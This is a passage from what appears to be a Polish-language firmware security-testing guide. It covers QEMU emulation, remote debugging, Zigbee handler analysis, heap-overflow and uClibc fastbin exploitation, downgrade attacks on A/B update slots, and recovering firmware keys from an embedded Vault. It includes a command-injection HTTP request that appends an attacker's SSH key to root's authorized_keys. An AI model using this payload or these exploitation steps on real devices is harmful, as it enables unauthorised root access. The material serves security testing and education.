Zastępczy init powinien odwzorowywać operacyjne elementy oryginalnej ścieżki rozruchu: zamontować `devtmpfs`, wywołać `setsid()`, podłączyć `/dev/console` do deskryptorów plików 0–2, zamontować `/proc` i `/sys`, zaczekać na udostępnione urządzenie blokowe, zamontować zmodyfikowany system root tylko do odczytu, odłączyć pseudo systemy plików starego systemu root, przenieść nowy punkt montowania na `/`, wykonać `chroot` i uruchomić `execve()` oryginalnego firmware'owego `/sbin/init`. Odłączenie `/dev`, `/proc` i `/sys` **przed** `MS_MOVE` zapobiega przypadkowemu odłączeniu punktów montowania należących do nowego systemu root.<sup>[[11]](#references)</sup>

Przechowuj zmienny stan urządzenia oddzielnie od zmodyfikowanego, niezmiennego systemu root. Nakładka qcow2 może zachować stan LVM oryginalnego dysku, a drugi dysk virtio tylko do odczytu może udostępniać zmodyfikowany SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugowanie stanu obrazu offline

Sprawdź trwały stan poza guestem, jeśli powolne uruchamianie, destrukcyjne skrypty startowe lub zawodny zapis w konsoli utrudniają ustalenie przyczyny awarii. Nigdy nie podłączaj nakładki używanej przez działającą maszynę wirtualną; udostępnij ją za pomocą `qemu-nbd`, ogranicz wykrywanie LVM do zamierzonej partycji NBD i dezaktywuj grupę woluminów przed jej odłączeniem.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Aby powtarzalnie izolować usterki, zapisuj pliki znaczników z sygnaturami czasowymi na stabilnym, zapisywalnym woluminie i weryfikuj je w trybie offline; `/dev/kmsg`, FIFO i nietrwałe konsole mogą dawać fałszywie ujemne wyniki z powodu ograniczania liczby komunikatów lub przedwczesnego zakończenia procesu. Zanim zmienisz niezwiązany kod, porównaj też dokładne interfejsy między warstwami: `uname -r` z `/lib/modules/`, funkcje ext4 na dysku z konfiguracją jądra oraz generację Mesa `libGL` z ABI sterownika DRI i nazwami sterowników wynikającymi z PCI. Komponent może istnieć, a nawet pomyślnie załadować się przez `dlopen()`, a mimo to być bezużyteczny, jeśli jego konsument oczekuje innego ABI.<sup>[[11]](#references)</sup>

## Analiza dynamiczna w praktyce

Na tym etapie do analizy wykorzystuje się rzeczywiste lub emulowane środowisko urządzenia. Niezbędne jest utrzymanie dostępu do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji ze sprzętem, co czasem wymaga ponownego uruchomienia emulatora. Analiza powinna obejmować ponowne sprawdzenie systemu plików, wykorzystanie dostępnych stron internetowych i usług sieciowych oraz badanie luk w bootloaderze. Testy integralności firmware'u mają kluczowe znaczenie dla wykrycia potencjalnych luk typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym. Wykorzystuje się do tego narzędzia takie jak gdb-multiarch, Frida i Ghidra, aby ustawiać punkty przerwania i wykrywać luki za pomocą fuzzingu oraz innych technik.

W przypadku celów wbudowanych bez pełnego debuggera **skopiuj na urządzenie statycznie linkowany `gdbserver` i podłącz się zdalnie**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / radio-coprocessora

W hubach IoT stos RF jest często rozdzielony między **radio MCU** a proces użytkownika systemu Linux. Przydatny sposób postępowania polega na mapowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **Parser po stronie kontrolera** na radio MCU
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do systemu Linux (na przykład `/dev/tty*`)
4. **Dyspozytor aplikacji** w głównym demonie
5. **Handler / maszyna stanów specyficzna dla protokołu**

Ta architektura daje dwa cele analizy wstecznej zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, ustal:

- **Grupy komunikatów** i tabele dyspozytora
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola rozróżniające producenta** (na przykład Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
- Które handlery są osiągalne tylko podczas **commissioning**, wykrywania lub pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch parowania i sprawdź, czy urządzenie nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, sniffing ruchu commissioning może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to ryzyko, więc sprawdź, czy testowane urządzenie faktycznie wymusza ich użycie.

### Specyficzne dla producenta handlery protokołu i osiągalność zależna od FSM

Polecenia Zigbee/ZCL specyficzne dla producenta są często lepszym celem niż standardowe klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **FSM**, których walidacja jest mniej sprawdzona.<sup>[[8]](#references)</sup>

Praktyczny sposób postępowania:

- Analizuj wstecz dyspozytor poleceń, aż znajdziesz **handler dostępny tylko dla producenta**.
- Odtwórz tabele **stanu FSM**, **zdarzeń**, **warunków**, **akcji** i **następnego stanu**.
- Znajdź **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie ponowień/błędów, które ostatecznie resetują lub zwalniają dane kontrolowane przez atakującego.
- Ustal, które prawidłowe wymiany protokołu są potrzebne, by wprowadzić demona w podatny stan, zamiast zakładać, że wadliwy handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na opóźnienia odtwarzanie pakietów z frameworka Python może być zbyt wolne. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na rzeczywistym sprzęcie (na przykład **nRF52840**) z użyciem stosu klasy producenckiej, aby udostępnić właściwe **endpointy**, **atrybuty** i synchronizację commissioning.

### Klasa błędów w pobieraniu fragmentów wbudowanych demonów

Powtarzająca się klasa błędów firmware występuje przy **pobieraniu podzielonych na fragmenty blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Kolejne fragmenty sprawdzają jedynie kontrolowane przez atakującego pola **dotyczące bieżącego pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia, czy mieści się ono w **pierwotnie zaalokowanym rozmiarze**.

Pozwala to atakującemu wysłać:

- Pierwszy prawidłowy fragment z zadeklarowanym **małym** rozmiarem całkowitym, aby wymusić małą alokację na stercie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany rozmiar dotyczący bieżącego pakietu, który przechodzi nowe kontrole, a jednocześnie powoduje przepełnienie pierwotnie zaalokowanego bufora.

Gdy podatna ścieżka jest dostępna przez logikę commissioning, exploitacja musi obejmować wystarczającą **emulację urządzenia**, by przeprowadzić cel do oczekiwanego stanu pobierania modelu lub bloba przed wysłaniem nieprawidłowych fragmentów.

### Wyzwalanie `free()` przez protokół

W wbudowanych demonach najłatwiejszym sposobem wywołania exploitacji metadanych sterty jest często nie „czekanie na czyszczenie”, lecz **wymuszenie obsługi błędu przez sam protokół**:<sup>[[8]](#references)</sup>

- Wyślij nieprawidłowe kolejne fragmenty, aby wprowadzić FSM w stan **ponowienia** lub **błędu**.
- Przekrocz limit ponowień, aby demon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()`, by uruchomić prymitywy po stronie alokatora, zanim proces ulegnie awarii z innych przyczyn.

Jest to szczególnie przydatne w przypadku alokatorów **musl/uClibc/dlmalloc-podobnych** w systemie Linux dla urządzeń wbudowanych, gdzie uszkodzenie metadanych chunków może zmienić logikę unlink/unbin w prymityw zapisu. Stabilnym podejściem jest uszkodzenie **pola rozmiaru**, by przekierować przechodzenie alokatora do **fałszywych chunków umieszczonych w przepełnionym buforze**, zamiast od razu nadpisywać rzeczywiste wskaźniki binów i powodować awarię procesu.

## Eksploatacja binarna i proof-of-concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu oraz programowania w językach niskiego poziomu. Ochrona środowiska uruchomieniowego binariów jest rzadko stosowana w systemach wbudowanych, ale jeśli występuje, mogą być potrzebne techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące exploitacji fastbin w uClibc (Linux dla urządzeń wbudowanych)

- **Fastbins i konsolidacja:** uClibc używa fastbinów podobnych do tych w glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fałszywy chunk musi przejść kontrole (prawidłowy rozmiar, `fd = 0` i sąsiednie chunki uznane za „zajęte”).<sup>[[6]](#references)</sup>
- **Binarne pliki bez PIE przy ASLR:** jeśli ASLR jest włączone, ale główny plik binarny jest **bez PIE**, adresy `.data/.bss` wewnątrz binarium są stabilne. Można wskazać obszar przypominający prawidłowy nagłówek chunka sterty, aby skierować alokację fastbin na **tablicę wskaźników do funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając końcowe bajty kontrolowane przez atakującego do użycia w stack pivot/łańcuchu ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu i przekazać do niego sterowanie.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane systemy operacyjne do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania ocen bezpieczeństwa i testów penetracyjnych urządzeń Internetu Rzeczy (IoT). Oszczędza dużo czasu, udostępniając wstępnie skonfigurowane środowisko z załadowanymi wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do testowania bezpieczeństwa systemów wbudowanych, oparty na Ubuntu 18.04 i wyposażony w narzędzia do testowania bezpieczeństwa firmware.

## Ataki downgrade firmware i niebezpieczne mechanizmy aktualizacji

Nawet jeśli producent wdroży weryfikację podpisu kryptograficznego obrazów firmware, **ochrona przed przywróceniem starszej wersji (downgrade) jest często pomijana**. Jeśli bootloader lub loader odzyskiwania jedynie weryfikuje podpis za pomocą wbudowanego klucza publicznego, ale nie sprawdza *wersji* (ani licznika monotonicznego) wgrywanego obrazu, atakujący może zgodnie z mechanizmem zainstalować **starsze, podatne firmware z prawidłowym podpisem**, ponownie wprowadzając załatane podatności.<sup>[[4]](#references)</sup>

Typowy przebieg ataku:

1. **Pozyskaj starszy podpisany obraz**
   * Pobierz go z publicznego portalu pobierania producenta, CDN lub strony pomocy technicznej.
   * Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. z `assets/firmware/` w pliku Android APK).
   * Pozyskaj go z repozytoriów stron trzecich, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** przez dowolny dostępny kanał aktualizacji:
   * Interfejs WWW, API aplikacji mobilnej, USB, TFTP, MQTT itp.
   * Wiele konsumenckich urządzeń IoT udostępnia nieuwierzytelnione endpointy HTTP(S), które akceptują blob firmware zakodowany w Base64, dekodują go po stronie serwera i uruchamiają odzyskiwanie/aktualizację.
3. Po downgrade wykorzystaj podatność załataną w nowszym wydaniu (na przykład filtr command injection dodany w późniejszej wersji).
4. Opcjonalnie wgraj z powrotem najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: command injection po downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym (zdegradowanym) firmware parametr `md5` jest bezpośrednio łączony z poleceniem powłoki bez sanityzacji, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu root z użyciem klucza SSH). W nowszych wersjach firmware dodano podstawowy filtr znaków, ale brak ochrony przed downgrade’em sprawia, że poprawka nie ma znaczenia.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do powiązanych z urządzeniem aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane bez szyfrowania w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` czy nawet zwykłe `unzip` pozwalają pobrać podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Ominięcie ochrony przed downgrade’em wyłącznie w updaterze w konstrukcjach z gniazdami A/B

Niektórzy dostawcy implementują ochronę przed downgrade’em w postaci **ratchet**, ale wyłącznie w logice *updatera* (na przykład w procedurze UDS przez CAN, poleceniu recovery lub agencie OTA działającym w userspace). Jeśli **bootloader** sprawdza później tylko podpis/CRC obrazu i ufa tablicy partycji lub metadanym gniazda, nadal można ominąć ochronę przed rollbackiem.<sup>[[7]](#references)</sup>

Typowa słaba konstrukcja:

- Metadane firmware’u zawierają zarówno deskryptor wersji, jak i **security ratchet** / licznik monotoniczny.
- Updater porównuje ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze, podpisane obrazy.
- Bootloader **nie** analizuje tego ratchet i przed uruchomieniem wybranego gniazda weryfikuje jedynie nagłówek, CRC i podpis.
- Aktywacja gniazda jest zapisywana oddzielnie w tablicy partycji lub liczniku generacji dla każdego gniazda i **nie jest kryptograficznie powiązana** z dokładnym skrótem zweryfikowanego firmware’u.

Tworzy to prymityw **zweryfikuj jeden obraz / uruchom inny obraz** w systemach z dwoma gniazdami. Jeśli atakujący może sprawić, że updater oznaczy gniazdo B jako następny cel rozruchu przy użyciu aktualnego, podpisanego obrazu, a później — przed ponownym uruchomieniem — nadpisać gniazdo B, bootloader może mimo to uruchomić starszy obraz, ponieważ ufa tylko wcześniej zatwierdzonym metadanym gniazda.

Typowy schemat nadużycia:

1. Wgraj **aktualny, podpisany** firmware do nieaktywnego gniazda i uruchom standardową procedurę weryfikacji/przełączania, aby układ oznaczył to gniazdo jako następne aktywne.
2. **Nie uruchamiaj jeszcze ponownie urządzenia**. W tej samej sesji ponownie wywołaj procedurę przygotowania/kasowania gniazda.
3. Wykorzystaj nieaktualny stan rozruchu lub logikę wyboru gniazda, aby updater skasował **to samo fizyczne gniazdo**, które właśnie zostało aktywowane.
4. Zapisz w tym gnieździe **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę weryfikacji, która egzekwuje ratchet, i uruchom urządzenie ponownie bezpośrednio.
6. Bootloader wybiera aktywowane gniazdo, weryfikuje jedynie podpis/integralność i uruchamia stary obraz.

Na co zwracać uwagę podczas analizy wstecznej implementacji aktualizacji A/B:

- Wybór gniazda oparty na **flagach rozruchowych**, które nie są odświeżane po pomyślnym przełączeniu.
- Procedura w rodzaju `prepare_passive_slot()`, która kasuje gniazdo na podstawie nieaktualnego stanu, zamiast **aktualnego, zatwierdzonego układu**.
- Funkcja w rodzaju `part_write_layout()`, która jedynie zwiększa **licznik generacji** / ustawia flagę aktywności i nie zapisuje skrótu zweryfikowanego obrazu.
- Kontrole ratchet zaimplementowane w userspace lub kodzie updatera, ale **nie** w ROM / bootloaderze / etapach secure boot.
- Procedury kasowania lub recovery, które pozostawiają gniazdo oznaczone jako rozruchowe, nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *endpointu aktualizacji* są odpowiednio chronione (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. podpisy sprawdza kod ROM)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko podpis/CRC?
* Czy metadane aktywacji gniazda są **powiązane ze zweryfikowanym skrótem/wersją firmware’u**, czy gniazdo można zmodyfikować po aktywacji?
* Czy po pomyślnym przełączeniu gniazda urządzenie musi zostać ponownie uruchomione, czy też w tej samej sesji nadal można wywołać kolejne procedury aktualizacji/kasowania?
* Czy kod userlandu wykonuje dodatkowe kontrole poprawności (np. dozwolona mapa partycji, numer modelu)?
* Czy przepływy aktualizacji *częściowej* lub *z kopii zapasowej* korzystają ponownie z tej samej logiki weryfikacji?

> 💡  Jeśli brakuje któregokolwiek z powyższych elementów, platforma prawdopodobnie jest podatna na ataki rollback.

## Podatny firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, jako punktu wyjścia użyj następujących projektów podatnego firmware’u.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware’u ze stanu wbudowanego KMS/Vault

Gdy obraz aktualizacji łączy niewielkie metadane w postaci jawnej z dużym blobem o wysokiej entropii, przed próbami brute-force przeprowadź analizę kontenera:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to sól, a pozostałe bajty to szyfrogram.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, mocno sugeruje, że jest to szyfrogram RSA-2048 opakowujący losowe hasło/klucz sesyjny firmware’u.
- Odłączone dane PGP w tym samym pliku często służą wyłącznie do ochrony autentyczności; nie zakładaj, że odpowiadają za poufność.

Jeśli statyczne poszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, przeanalizuj **operacyjną ścieżkę deszyfrowania**, zamiast ograniczać się do wyszukiwania kluczy prywatnych:

- Zdekompiluj updater / plik binarny do zarządzania i prześledź, kto odczytuje zaszyfrowany blob, która funkcja pomocnicza/API go rozpakowuje oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony główny system plików w poszukiwaniu stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) oraz plików jednostek i skryptów init.
- Traktuj zapisane w postaci jawnej polecenia `vault operator unseal ...`, klucze recovery, tokeny bootstrap lub lokalne skrypty automatycznego odpieczętowywania KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend pamięci masowej, odtworzenie tego środowiska jest zazwyczaj łatwiejsze niż ponowna implementacja wewnętrznych mechanizmów Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Z uprawnieniami root na sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie w izolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Sprawdź odzyskany klucz RSA, używając dokładnej pary padding/hash zastosowanej przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 ani nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie stosują SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL dostawcy (`EVP_BytesToKey`, często MD5 w starszych urządzeniach) przed próbą odszyfrowania AES-CBC.

W ten sposób problem „zaszyfrowanego firmware’u” staje się bardziej ogólny: **odzyskaj operacyjne klucze po stronie urządzenia, a następnie odtwórz dokładne parametry unwrap + KDF offline**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Łamanie zabezpieczeń firmware’u z Claude: umiejętności na poziomie seniora, samodzielność juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia testowania bezpieczeństwa firmware’u](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: kompleksowy przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv — Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania — część 2: obejście zabezpieczenia przed downgrade’em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zamiga: zdalne wykorzystywanie Philips Hue Bridge przez sieć](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, część 1: rozpakowywanie](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacja jądra Linuksa — dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, część 2: debugowanie i naprawianie](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Hasła BIOS-u Dell: słabe szyfrowanie XOR umożliwia odzyskanie ich z pamięci flash SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn — narzędzia do odzyskiwania haseł BIOS-u Dell](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — odświeżenie wiedzy o hackingu sprzętu, część 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
